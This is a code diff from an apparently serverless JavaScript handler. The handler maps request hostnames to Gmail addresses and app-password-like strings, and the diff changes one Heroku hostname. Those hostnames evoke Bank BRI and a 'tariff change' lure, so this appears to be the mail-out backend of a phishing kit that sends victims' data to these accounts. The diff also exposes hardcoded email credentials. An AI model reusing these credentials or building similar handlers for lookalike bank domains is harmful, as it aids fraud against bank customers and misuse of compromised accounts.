@@ -32,7 +32,7 @@ export default function handler(req, res) {
         email = 'accbrimo05@gmail.com';
         pass = 'hluxpmqqqqsjrbaf';
 
-    } else if(url == 'britarif--ubah.herokuapp.com'){
+    } else if(url == 'app-ubahtarifbri.herokuapp.com'){
         email = 'callbribricoid66@gmail.com';
         pass = 'epurigonxbspyuud';
 
